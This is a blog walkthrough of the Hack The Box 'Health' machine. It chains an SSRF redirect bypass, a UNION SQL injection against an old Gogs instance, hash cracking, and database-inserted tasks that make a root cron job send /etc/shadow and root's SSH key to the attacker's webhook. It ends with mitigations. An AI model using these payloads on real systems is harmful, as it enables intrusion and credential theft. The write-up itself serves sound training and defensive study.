---
layout: post
title: Hack The Box Walkthrough - Health
date: 2023-01-07
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/01/HTB/Health
img: 2023/01/Health/Health.png
---

This was a difficult, but fun machine. It came out as an easy machine before being reclassified as medium. It took me a long time before I finally pwned it. 

It started with using a web application to reach an internal application and perform SQL Injection. Then I used the same application to read files on the server and become root.

* Room: Health
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Health](https://app.hackthebox.com/machines/Health)
* Author: [irogir](https://app.hackthebox.com/users/476556)

## Enumeration

I launch rustscan to look for opened ports on the server.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.134.205:22
Open 10.129.134.205:80

...

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChNRnKkpENG89qQHjD+2Kt9H7EDTMkQpzin70Rok0geRogbYVckxywChDv3yYhaDWQ9RrsOcWLs3uGzZR9nCfXOE3uTENbSWV5GdCd3wQNmWcSlkTD4dRcZshaAoMjs1bwzhK+cOy3ZU/ywbIXdHvAz3+Xvyz5yoEnboWYdWtBNFniZ7y/mZtA/XN19sCt5Pcme
Y40YFSuaVy/PUQnozplBVBIN6W5gnSE0Y+3J1MLBUkvf4+5zKvC+WLqA394Y1M+/UcVcPAjo6maik1JZNAmquWWo+y+28PdXSm9F2p2HAvwJjXc96f+Fl80+P4j1yxrhWC5AZM8fNCX8FjD7Jl7
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOR0vwVJwhe/5A7dkomT/li2XC2nvv6/4J6Oe8Xeyi/YQspx3RQGz3aG1sWTPstLu7yno0Z+Lk/GotRdyivSdLA=
|   256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINgiR3y8U+HenhKVoN1EFipbmC6EjO3fWwWPUqa8EeJh
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There were 2 open ports:
* 22 - SSH
* 80 - HTTP


## Webhooks

I launched a browser and looked at the website. 

![Website](/assets/images/2023/01/Health/MainSite.png "Website")

The site allowed checking if another site was up. And sent the site content to a webhook. 

I started a web server on my machine and tried the application.

![Testing](/assets/images/2023/01/Health/Testing.png "Testing")

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.176 - - [05/Jan/2023 06:34:28] code 404, message File not found
10.10.11.176 - - [05/Jan/2023 06:34:28] "GET /monitored HTTP/1.0" 404 -
10.10.11.176 - - [05/Jan/2023 06:34:28] code 501, message Unsupported method ('POST')
10.10.11.176 - - [05/Jan/2023 06:34:28] "POST /payload HTTP/1.1" 501 -
```

It worked, but I needed something else to grab the content of the payload. I launched netcat on another port and used that for the payload URL. 

```http
POST /payload/ HTTP/1.1
Host: 10.10.14.6
Accept: */*
Content-type: application/json
Content-Length: 117

{"webhookUrl":"http:\/\/10.10.14.6:8000\/payload\/","monitoredUrl":"http:\/\/10.10.14.6\/monitored\/","health":"down"}
```

I started playing with sending different payloads to the application. I found out I could send it json instead of a URL-encoded form. This made it easier to read and modify in Burp Repeater.

```http
POST /webhook HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 224
Origin: http://target.htb
Connection: close
Referer: http://target.htb/
Cookie: XSRF-TOKEN=eyJpdiI6ImFsOEk3M21rVHVuTU8yRkwrc1JSeHc9PSIsInZhbHVlIjoieVBGWlc1WVBiVUFKdjV2MWRqQUorYWNxd0wwaFMwQUQ2RTFzRG9iSDJjb0lmUWJVS3dVa2RUZmtiUXBIUW85ckpZUUJVMGFPQXdERFFuaUR1SW1Mam5WUDhGSTNxdjIzWFhQVUZGcXExc2dsamJYdXhha0JBUmpXekFuR0tDN3YiLCJtYWMiOiJiMDdmMmNkMDM1ZGExMzM3OGUwMmJjNmFjNzA1NDYxNWYyYzkwOTIyNWRiZDkxZGU3M2ViY2JkM2MwNTg0MDIyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ilk4M05WQWFmNVJSMVJoc2txNSt6Q0E9PSIsInZhbHVlIjoiZFVzOFAweStjMm9ENHZnL3VBQkMvZ1RLeVphTVovNW9PSFplYnpQeTBuTjBRKzlPRkQyb213dVN3bEhRWXNSemFqR1k1TXU0YW1ZRXhKZk85WEJmcVR4ZXZiVjVnNkR6b0Rwdno1aWI4dmI2UkQyVXhYa0JIMzBDUXlRcG54N2EiLCJtYWMiOiJkN2Q3YmE0NGFhNTRhN2YyNWFmZTQ4OWU3YTYyNzY5NjY5N2RlMzYzMGUxN2U4YzMzMGZiNjU5MzQ3ZWZmODZlIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1

{
	"_token": "6RWanPgljj9laRaM3gHG9xNHPgibNdgtqUeN0EDO",
	"webhookUrl": "http://10.10.14.6:8000/payload",
	"monitoredUrl": "http://10.10.14.6/monitored",
	"frequency": "* * * * *",
	"onlyError": 0,
	"action": "Test"
}
```

I also saw that if the monitored website was up, the content was sent to the webhook.

```json
{
  "webhookUrl":"http:\/\/10.10.14.6:8000\/payload",
  "monitoredUrl":"http:\/\/10.10.14.6\/monitored",
  "health":"up",
  "body":"<html>\n<body>\nTest\n<\/body>\n<\/html>\n",
  "message":"HTTP\/1.0 200 OK",
  "headers":{"Host":"10.10.14.6","Date":"Thu, 05 Jan 2023 11:48:36 GMT","Connection":"close","Content-Type":"text\/html; charset=UTF-8","Content-Length":"35"}
}
```

I thought I could use [Server-Side Request Forgery (SSRF)](https://portswigger.net/web-security/ssrf) to read from the web server.

I tried monitoring things like localhost, and files on the server. But they were rejected.

![Errors](/assets/images/2023/01/Health/Errors.png "Errors")

There was some validation to prevent things like `localhost` and `file://`. I tried using my machine as the monitored URL and sending a redirection from it.

```bash
$ cat redirect.php            
<?php
header("Location: http://localhost/");

$ php -S 0.0.0.0:80 
[Thu Jan  5 06:59:48 2023] PHP 8.1.12 Development Server (http://0.0.0.0:80) started
[Thu Jan  5 07:00:19 2023] 10.10.11.176:48094 Accepted
[Thu Jan  5 07:00:19 2023] 10.10.11.176:48094 [302]: GET /redirect.php
[Thu Jan  5 07:00:19 2023] 10.10.11.176:48094 Closing
```

It worked, my webhook received the content of the application.

```bash
$ nc -klvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.176] 52638
POST /payload HTTP/1.1
Host: 10.10.14.6:8000
Accept: */*
Content-type: application/json
Content-Length: 8993
Expect: 100-continue

{
  "webhookUrl": "http://10.10.14.6:8000/payload",
  "monitoredUrl": "http://10.10.14.6/redirect.php",
  "health": "up",
  "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>HTTP Monitoring Tool<\/title>\n    <link href=\"http:\/\/localhost\/css\/app.css\" rel=\"stylesheet\" type=\"text\/css\"\/>\n<\/head>\n<body>\n<div class=\"container\">\n        <div class=\"container\" style=\"padding: 150px\">\n\n\t<h1 class=\"text-center\">health.htb<\/h1>\n\t<h4 class=\"text-center\">Simple health checks for any URL<\/h4>\n\n\t<hr>\n\n\n\n\n\t<p>This is a free utility that allows you to remotely check whether an http service is available. It is useful if you want to check whether the server is correctly running or if there are any firewall issues blocking access.<\/p>\n\n\t<div class=\"card-header\">\n\t    Configure Webhook ..."
}

```

I was able to use it to query the server. But I already had access to the site on port 80. So that did not help much. I was going to write a script to try all ports on the server. But I remembered that RustScan did not show filtered ports. I scanned the server again, but with Nmap.

```bash
$ nmap target                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-04 08:42 EST
Nmap scan report for target (10.10.11.176)
Host is up (0.025s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp

Nmap done: 1 IP address (1 host up) scanned in 1.55 seconds
```

Port 3000 was filtered. But I might be able to access it through the SSRF. I changed my redirection.

```php
<?php
header("Location: http://localhost:3000/");
```

And sent my payload again. This time I got the content of a different site in the webhook payload.

```json
{
  "webhookUrl":"http:\/\/10.10.14.6:8000\/payload",
  "monitoredUrl":"http:\/\/10.10.14.6\/redirect.php",
  "health":"up",
  "body":"<!DOCTYPE html>\n<html>\n\t<head data-suburl=\"\">\n\t\t
  ...
  <meta name=\"author\" content=\"Gogs - Go Git Service\" \/>\n\t\t
  <meta name=\"description\" content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\" \/>\n\t\t
  <meta name=\"keywords\" content=\"go, git, self-hosted, gogs\">
  ...
  \u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta 
  ...
  ",
  "message":"HTTP\/1.0 302 Found",
  "headers":{"Host":"10.10.14.6","Date":"Thu, 05 Jan 2023 12:32:06 GMT","Connection":"close","X-Powered-By":"PHP\/8.1.12","Location":"http:\/\/localhost:3000\/","Content-type":"text\/html; charset=UTF-8","Content-Type":"text\/html; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0"}
  }
```

I removed the content, but we can see that the server had a very old beta version (0.5.5.1010 Beta) of [Gogs](https://gogs.io/).

## SQL Injection

I searched for known vulnerabilities in this version of Gogs and found that it was vulnerable to [SQL Injection](https://www.exploit-db.com/exploits/35238). ExploitDB had two proofs of concept (POC). The user search was simpler, so I tried this one first.

I started by trying the user search feature. 

```php
<?php
header('Location: http://localhost:3000/api/v1/users/search?q=a');
```

It gave me a user back. 

```json
{
  "webhookUrl": "http://10.10.14.6:8000/payload",
  "monitoredUrl": "http://10.10.14.6/redirect.php",
  "health": "up",
  "body": "{\"data\":[{\"username\":\"susanne\",\"avatar\":\"//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce\"}],\"ok\":true}",
  "message": "HTTP/1.0 302 Found",
  "headers": {
    "Host": "10.10.14.6",
    "Date": "Thu, 05 Jan 2023 12:51:23 GMT",
    "Connection": "close",
    "X-Powered-By": "PHP/8.1.12",
    "Location": "http://localhost:3000/api/v1/users/search?q=a",
    "Content-type": "text/html; charset=UTF-8",
    "Content-Type": "application/json; charset=UTF-8",
    "Set-Cookie": "_csrf=; Path=/; Max-Age=0",
    "Content-Length": "111"
  }
}
```

I took note of the username and tried injecting some SQL. The code was removing spaces, so I had to use `/**/` instead.

Next, I tried the payload from the POC, but it failed. So I had to start experimenting to build my own injection.

I used `Order By` to figure out how many fields needed to be returned by the query. 

```php
header("Location: http://localhost:3000/api/v1/users/search?q=')/**/Order/**/By/**/27/**/--/**/-");
```

27 fields worked. 

```json
{"body": "{\"data\":[{\"username\":\"susanne\",\"avatar\":\"//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce\"}],\"ok\":true}"}

```

But 28 failed. 

```php
header("Location: http://localhost:3000/api/v1/users/search?q=')/**/Order/**/By/**/28/**/--/**/-");
```

```json
{
  "webhookUrl": "http://10.10.14.7:8000/payload",
  "monitoredUrl": "http://10.10.14.7/redirect.php",
  "health": "down"
}
```

I knew I needed to return 27 fields in my union query. I had to find out which of those fields were returned in the JSON.

```php
header("Location: http://localhost:3000/api/v1/users/search?q='/**/AND/**/1=2)/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/FROM/**/user/**/where/**/('%25'%3D'");
```

I could use the 3rd and 15th fields to extract data.

```json
{
  "data": [
    {
      "username": "3",
      "avatar": "//1.gravatar.com/avatar/15"
    }
  ],
  "ok": true
}
```

I cloned the [Gogs' git repository](https://github.com/gogs/gogs) and checked out the `v0.5.5` tag. I looked at the code and saw that I needed to extract the `passwd` and `salt` fields from the [user table](https://github.com/gogs/gogs/blob/v0.5.5/models/user.go#L53).

I extracted the hashed password.

```php
header("Location: http://localhost:3000/api/v1/users/search?q='/**/AND/**/1=2)/**/UNION/**/ALL/**/SELECT/**/1,2,passwd,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/FROM/**/user/**/where/**/('%25'%3D'");
```

```json
{
  "data": [
    {
      "username": "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37",
      "avatar": "//1.gravatar.com/avatar/15"
    }
  ],
  "ok": true
}
```

And the salt.

```php
header("Location: http://localhost:3000/api/v1/users/search?q='/**/AND/**/1=2)/**/UNION/**/ALL/**/SELECT/**/1,2,salt,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/FROM/**/user/**/where/**/('%25'%3D'");
```

```json
{
  "data": [
    {
      "username": "sO3XIbeW14",
      "avatar": "//1.gravatar.com/avatar/15"
    }
  ],
  "ok": true
}
```

I needed to crack the hash, but I did not know the format I should use for hashcat. I found an [issue](https://github.com/hashcat/hashcat/issues/1583) that explained how to convert the hash to the format hashcat expected.


```bash
$ echo -n 'sO3XIbeW14' | base64          
c08zWEliZVcxNA==

$ perl -e 'print pack ("H*", "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37")' | base64 
ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
```

I saved those values to a file and launched hashcat.

```bash
$ cat hash.txt    
sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=


$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
                                                           
OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2869/5803 MB (1024 MB allocatable), 6MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:REDACTED
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U...9O/jc=
Time.Started.....: Tue Jan  3 06:39:54 2023 (27 secs)
Time.Estimated...: Tue Jan  3 06:40:21 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2640 H/s (7.80ms) @ Accel:256 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 72192/14344384 (0.50%)
Rejected.........: 0/72192 (0.00%)
Restore.Point....: 70656/14344384 (0.49%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9984-9999
Candidate.Engine.: Device Generator
Candidates.#1....: jonquil -> 011392
Hardware.Mon.#1..: Util: 96%

Started: Tue Jan  3 06:39:52 2023
Stopped: Tue Jan  3 06:40:23 2023
```

I tried ssh with the cracked password.

```bash
$ ssh susanne@target
susanne@target's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jan  3 11:42:34 UTC 2023

  System load:  0.01              Processes:           173
  Usage of /:   66.4% of 3.84GB   Users logged in:     0
  Memory usage: 11%               IP address for eth0: 10.10.11.176
  Swap usage:   0%


0 updates can be applied immediately.

susanne@health:~$ ls
user.txt

susanne@health:~$ cat user.txt 
REDACTED
```

## Getting Root

Once connected to the server, I started looking for ways to elevate my privileges. I could not run anything as `sudo` and I did not find any suspicious `suid` binaries.

I looked at the websites for credentials in configuration files. The Gogs code was not readable by my user. But the Laravel app on port 80 was. 

```bash
susanne@health:~$ cat .env

...
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=REDACTED
...
```

I connected to the database, but I did not find anything of interest. There was a `user` table, but it was empty.

I created an SSH tunnel to take a better look at the Gogs installation and connected with susanne's credentials. I found a [Remote Code Execution (RCE)](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/gogs_git_hooks_rce) vulnerability in hooks. But I failed to exploit it. The endpoint to extract the hooks seems disabled. And my POST requests to create a new hook were all rejected. 

I kept looking around the server. I ran [pspy](https://github.com/DominicBreuker/pspy) and saw that [Artisan](https://laravel.com/docs/9.x/artisan) was running as root every minute.

```bash
2023/01/04 11:00:01 CMD: UID=0    PID=2384   | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1 
```

I looked at what `schedule:run` was doing. 

```php
protected function schedule(Schedule $schedule)
{
    /* Get all tasks from the database */
    $tasks = Task::all();

    foreach ($tasks as $task) {

        $frequency = $task->frequency;

        $schedule->call(function () use ($task) {
            /*  Run your task here */
            HealthChecker::check($task->webhookUrl, $task->monitoredUrl, $task->onlyError);
            Log::info($task->id . ' ' . \Carbon\Carbon::now());
        })->cron($frequency);
    }
}
```

It was reading tasks from the database and sending them to `HeathChecker::check()`. I looked at the code for this. 

```php
public static function check($webhookUrl, $monitoredUrl, $onlyError = false)
{
    $json = [];
    $json['webhookUrl'] = $webhookUrl;
    $json['monitoredUrl'] = $monitoredUrl;

    $res = @file_get_contents($monitoredUrl, false);
    if ($res) {

        if ($onlyError) {
            return $json;
        }

        $json['health'] = "up";
        $json['body'] = $res;
        if (isset($http_response_header)) {
        $headers = [];
        $json['message'] = $http_response_header[0];

        for ($i = 0; $i <= count($http_response_header) - 1; $i++) {

            $split = explode(':', $http_response_header[$i], 2);

            if (count($split) == 2) {
                $headers[trim($split[0])] = trim($split[1]);
            } else {
                error_log("invalid header pair: $http_response_header[$i]\n");
            }

        }

        $json['headers'] = $headers;
        }

    } else {
        $json['health'] = "down";
    }

    $content = json_encode($json);

    // send
    $curl = curl_init($webhookUrl);
    curl_setopt($curl, CURLOPT_HEADER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER,
        array("Content-type: application/json"));
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
    curl_exec($curl);
    curl_close($curl);

    return $json;

}
```

It was performing the health check by reading the monitored URL with `file_get_contents` and sending the result to the webhook URL. Since I had the database credentials I could insert anything in there, bypassing the validation from the website. And the code was using `file_get_contents` to get the monitored URL, so I could use it to read local files.

I started by trying to read `/etc/passwd`. 

```sql
mysql> Insert Into tasks Values (1,'10.10.14.6:8000', 0, '/etc/passwd', '* * * * *', NOW(), NOW());
Query OK, 1 row affected (0.00 sec)
```

It worked.

```json
{
  "webhookUrl": "10.10.14.6:8000",
  "monitoredUrl": "/etc/passwd",
  "health": "up",
  "body": "root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/var\/run\/ircd:\/usr\/sbin\/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:\/run\/systemd\/netif:\/usr\/sbin\/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:\/run\/systemd\/resolve:\/usr\/sbin\/nologin\nsyslog:x:102:106::\/home\/syslog:\/usr\/sbin\/nologin\nmessagebus:x:103:107::\/nonexistent:\/usr\/sbin\/nologin\n_apt:x:104:65534::\/nonexistent:\/usr\/sbin\/nologin\nlxd:x:105:65534::\/var\/lib\/lxd\/:\/bin\/false\nuuidd:x:106:110::\/run\/uuidd:\/usr\/sbin\/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:\/var\/lib\/misc:\/usr\/sbin\/nologin\nlandscape:x:108:112::\/var\/lib\/landscape:\/usr\/sbin\/nologin\npollinate:x:109:1::\/var\/cache\/pollinate:\/bin\/false\nsshd:x:110:65534::\/run\/sshd:\/usr\/sbin\/nologin\nsusanne:x:1000:1000:susanne:\/home\/susanne:\/bin\/bash\ngogs:x:1001:1001::\/home\/gogs:\/bin\/bash\nmysql:x:111:114:MySQL Server,,,:\/nonexistent:\/bin\/false\n"
}
```

Next, I extracted the `/etc/shadow` file and started cracking the password. 

While hashcat was running, I checked to see if root had an ssh key. 

```sql
mysql> Insert Into tasks Values (1,'10.10.14.6:8000', 0, '/root/.ssh/id_rsa', '* * * * *', NOW(), NOW());
Query OK, 1 row affected (0.00 sec)
```

They did. 

```json
{
  "webhookUrl": "10.10.14.6:8000",
  "monitoredUrl": "/root/.ssh/id_rsa",
  "health": "up",
  "body": "-----BEGIN RSA PRIVATE KEY-----{KEY}-----END RSA PRIVATE KEY-----"
}
```

I used the key to connect as root and read the flag.

```bash
$ chmod 600 root_id_rsa 

$ ssh -i root_id_rsa root@target   
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan  4 11:31:32 UTC 2023

  System load:  0.0               Processes:           184
  Usage of /:   66.4% of 3.84GB   Users logged in:     1
  Memory usage: 15%               IP address for eth0: 10.10.11.176
  Swap usage:   0%


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@health:~# cat root.txt 
REDACTED
```

## Mitigations

There were a few issues with that box that could be fixed without too much work. 

First, the code that read the monitored URL should not follow redirects. The code uses `file_get_contents` which follows redirection by default. I didn't see a way from preventing it from following redirects. But it's easy to do with curl. The code should have used curl to read the monitored URL.

The server was using a very old version of Gogs. The installed version is from 2014 and is beta. There is a known SQLi vulnerability in this version of Gogs. The application was not exposed to the web, but you never know if someone can find a way around that. It could be an SSRF vulnerability like in this case. Or a disgruntled employee could use it to get data they should not have access to.

The password stored in the database was also very weak. Hashcat was able to break it quickly.

The next issue is with Artisan running as root. It should have been executed as a low-privileged account. Since it was doing the same thing as the website, it should probably have run as the web server. The validations performed when posting a health check should also have been executed before performing the actions.